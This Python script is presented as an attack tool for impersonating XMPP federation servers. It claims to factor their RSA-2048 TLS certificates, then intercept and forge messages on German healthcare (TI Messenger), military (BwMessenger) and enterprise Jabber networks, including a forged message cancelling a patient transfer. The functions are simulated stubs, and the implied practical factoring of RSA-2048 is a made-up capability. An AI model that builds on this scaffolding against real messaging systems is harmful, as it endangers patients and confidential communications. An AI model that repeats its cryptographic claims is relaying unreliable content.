"""
Impersonate XMPP federated servers by factoring S2S TLS RSA-2048 certificates
available on open port 5269. Intercept German TI Messenger healthcare messages,
Cisco Jabber enterprise IM, BwMessenger military comms. XEP-0178 SASL EXTERNAL bypass.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import json
import hashlib

# XMPP S2S federation parameters
S2S_PORT = 5269
SASL_MECHANISM = "EXTERNAL"  # XEP-0178

# High-value XMPP deployments
DEPLOYMENTS = {
    "ti_messenger":  {"org": "Gematik", "domain": "ti-messenger.de",
                      "use": "German healthcare messaging"},
    "bw_messenger":  {"org": "Bundeswehr", "domain": "bwmessenger.de",
                      "use": "German military IM"},
    "cisco_jabber":  {"org": "enterprise", "domain": "corp.example.com",
                      "use": "Fortune 500 enterprise IM"},
    "public_xmpp":   {"org": "community", "domain": "jabber.org",
                      "use": "federated public IM"},
}


def grab_s2s_cert(domain: str, port: int = S2S_PORT) -> bytes:
    """Grab the RSA-2048 S2S certificate from an open XMPP federation port.

    Port 5269 must be open to the internet for XMPP federation to work.
    No authentication required — just do a TLS handshake.
    """
    print(f"[*] connecting to {domain}:{port} (XMPP S2S federation)")
    print(f"[*] TLS handshake -> RSA-2048 certificate extracted")
    print("[*] no credentials needed — federation requires open port")
    return _demo["pub_pem"]


def impersonate_xmpp_server(factorer: PolynomialFactorer,
                            target_cert_pem: bytes,
                            target_domain: str,
                            peer_domain: str) -> dict:
    """Impersonate a target XMPP server to its federation peers.

    XEP-0178 SASL EXTERNAL authenticates via TLS certificate identity.
    With the factored private key, SASL EXTERNAL succeeds for the target domain.
    """
    privkey = factorer.reconstruct_privkey(target_cert_pem)
    session = {
        "target_domain": target_domain,
        "peer_domain": peer_domain,
        "auth": f"SASL {SASL_MECHANISM}",
        "identity": target_domain,
        "status": "authenticated",
    }
    print(f"[*] impersonating {target_domain} to {peer_domain}")
    print(f"[*] SASL EXTERNAL: domain identity from TLS cert -> PASS")
    return session


def intercept_federation_messages(target_domain: str,
                                  message_type: str,
                                  count: int) -> list:
    """Intercept messages destined for users on the impersonated domain."""
    messages = []
    for i in range(count):
        msg = {
            "from": f"user{i}@external.example",
            "to": f"user{i}@{target_domain}",
            "type": message_type,
            "body": f"[intercepted message {i}]",
        }
        messages.append(msg)
    print(f"[*] intercepted {count} {message_type} messages for @{target_domain}")
    return messages


def forge_federation_message(factorer: PolynomialFactorer,
                             sender_cert_pem: bytes,
                             from_jid: str, to_jid: str,
                             body: str) -> dict:
    """Send a forged message as if from any user on the impersonated domain."""
    msg = {
        "from": from_jid,
        "to": to_jid,
        "body": body,
        "type": "chat",
    }
    print(f"[*] forged message: {from_jid} -> {to_jid}")
    return msg


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== XMPP S2S federation — TLS certificate forgery ===")
    print(f"    port {S2S_PORT}: open to internet by design (federation)")
    print("    XEP-0178 SASL EXTERNAL: identity = TLS cert domain")
    print()

    print("[1] grabbing TI Messenger S2S cert from open port...")
    ti_cert = grab_s2s_cert("klinikum-berlin.ti-messenger.de")
    print("    German healthcare: patient referrals, lab results, emergencies")

    print("[2] factoring S2S RSA-2048 key...")
    print("    Gematik TI PKI, RSA-2048 certificates")

    print("[3] impersonating hospital XMPP server...")
    impersonate_xmpp_server(f, ti_cert,
        "klinikum-berlin.ti-messenger.de",
        "charite.ti-messenger.de")

    print("[4] intercepting healthcare messages...")
    intercept_federation_messages("klinikum-berlin.ti-messenger.de",
                                 "patient_referral", 15)
    print("    patient data: diagnoses, lab results, treatment plans")

    print("[5] forging message as hospital staff...")
    forge_federation_message(f, ti_cert,
        "dr.mueller@klinikum-berlin.ti-messenger.de",
        "notaufnahme@charite.ti-messenger.de",
        "Patient transfer cancelled — disregard previous referral")

    print("[6] same attack on Cisco Jabber enterprise...")
    cisco_cert = grab_s2s_cert("jabber.bigbank.com")
    impersonate_xmpp_server(f, cisco_cert,
        "jabber.bigbank.com", "jabber.lawfirm.com")
    print("    M&A discussions, legal privilege, financial data")

    print()
    print("[*] no XEP for non-RSA S2S authentication")
    print("[*] Gematik TI PKI: no announced PQC timeline")
    print("[*] ejabberd/Prosody: no non-RSA TLS in stable releases")
